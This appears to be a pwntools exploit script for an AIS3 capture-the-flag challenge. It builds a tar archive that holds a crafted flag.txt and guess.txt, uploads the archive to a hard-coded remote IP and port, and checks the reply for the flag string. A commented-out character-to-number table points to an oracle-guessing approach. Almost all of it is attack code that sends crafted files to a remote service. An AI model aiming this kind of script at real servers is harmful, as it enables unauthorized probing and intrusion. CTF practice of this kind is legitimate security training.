import subprocess
import os 
from pwn import *
import binascii
# context.log_level = 'DEBUG'
# os.chdir(os.path.dirname(__file__))
# path=os.path.join(os.getcwd(), 'guess.txt')
path='flag.txt'
print(path)
# dic={'a': '1.18563149536', 'c': '5.35893607022', 'b': '3.31316267676', 'e': '1.90226539346', 'd': '9.76842210324', 'f': '7.0922236863', '1': '7.78152057193', '0': '8.36927693075', '3': '6.35290002089', '2': '8.76513874692', '5': '9.81627943623', '4': '5.20350194081', '7': '4.37380577632', '6': '2.33801825825', '9': '4.1173100237', '8': '2.93564621477'}
for i in range(0,1):
    try:
        subprocess.check_output(['rm',path])
    except:
        print('err')
    fi=open(path,"w+")
    str_in=str('a')
    print(str_in)
    fi.write(str_in)
    fi.close()
    subprocess.check_output(['tar', '-cf', 'tmp.tar', path,'guess.txt'])
    fb=open('tmp.tar',"rb")
    content=fb.read()
    fb.close()
    size=os.path.getsize('tmp.tar')

    r=remote('60.250.197.227',11000)
    r.sendline(str(size))
    r.sendline(content)
    # print(r.recvall(timeout=30))
    rec=r.recvall()
    print(rec)
    if('AIS3'in rec):   
        break